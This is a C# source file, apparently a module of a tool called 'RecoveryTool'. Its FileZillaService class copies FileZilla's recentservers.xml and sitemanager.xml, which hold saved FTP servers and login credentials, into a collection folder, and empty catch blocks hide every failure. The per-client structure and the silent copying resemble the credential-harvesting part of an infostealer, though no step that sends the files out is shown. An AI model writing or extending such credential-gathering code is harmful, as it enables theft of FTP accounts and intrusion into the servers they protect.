using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.System.FTPClients
{
    public class FileZillaService
    {
        private static readonly string appdata = Path.Combine(Common.AppData, "FileZilla");

        internal static async Task SaveFileZillaAsync()
        {
            try
            {
                var recentServersPath = Path.Combine(appdata, "recentservers.xml");
                var siteManagerPath = Path.Combine(appdata, "sitemanager.xml");

                if (File.Exists(recentServersPath) || File.Exists(siteManagerPath))
                {
                    string ftpPath = Common.EnsureFileZillaPath();

                    await CopyFileAsync(recentServersPath, Path.Combine(ftpPath, "recentservers.xml"));
                    await CopyFileAsync(siteManagerPath, Path.Combine(ftpPath, "sitemanager.xml"));
                }
            }
            catch { }
        }

        private static async Task CopyFileAsync(string sourcePath, string destinationPath)
        {
            try
            {
                if (File.Exists(sourcePath))
                {
                    using FileStream sourceStream = new(sourcePath, FileMode.Open, FileAccess.Read, FileShare.Read);
                    using FileStream destinationStream = new(destinationPath, FileMode.Create, FileAccess.Write, FileShare.None);
                    await sourceStream.CopyToAsync(destinationStream);
                }
            }
            catch { }
        }
    }
}
